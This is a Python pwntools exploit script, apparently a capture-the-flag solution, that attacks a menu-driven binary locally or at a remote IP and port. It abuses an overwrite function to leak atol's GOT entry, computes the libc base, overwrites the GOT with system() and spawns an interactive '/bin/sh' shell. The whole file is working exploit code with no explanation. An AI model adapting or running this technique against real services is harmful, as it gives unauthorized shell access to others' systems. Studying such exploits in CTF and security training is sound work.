#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./main')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20303)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./main', checksec=False)


def add(add_count):
    p.sendlineafter('> ', '1')
    p.sendlineafter('List count: ', str(add_count))


def edit(edit_list_id, edit_item_id, edit_content):
    p.sendlineafter('> ', '3')
    p.sendlineafter('List id: ', str(edit_list_id))
    p.sendlineafter('Item id: ', str(edit_item_id))
    p.sendlineafter('New number: ', str(edit_content))


def overwrite(overwrite_list_id, overwrite_item_start_id,
              overwrite_item_end_id, overwrite_content):
    p.sendlineafter('> ', '4')
    p.sendlineafter('List id: ', str(overwrite_list_id))
    p.sendlineafter('Star id: ', str(overwrite_item_start_id))
    p.sendlineafter('End id: ', str(overwrite_item_end_id))
    p.sendlineafter('New number: ', str(overwrite_content))


got_atol = elf.got['atol']
add(1)
add(1)
overwrite(0, 4, 4, got_atol)
overwrite(0, 5, 5, got_atol + 0x40)
p.sendlineafter('> ', '5')
p.recvuntil(' : ')
p.recvuntil(' : ')
p.recvuntil(' : ')

addr_read = int(p.recvuntil('\n')[: -1])
libcbase = addr_read - libc.sym['read']
addr_system = libcbase + libc.sym['system']

edit(1, 0, addr_system)
# gdb.attach(p, 'b *0x402016\nc')
edit(0, 0, '/bin/sh\x00')
success('addr_read   = ' + hex(addr_read))
success('addr_system = ' + hex(addr_system))
# gdb.attach(p)
p.interactive()
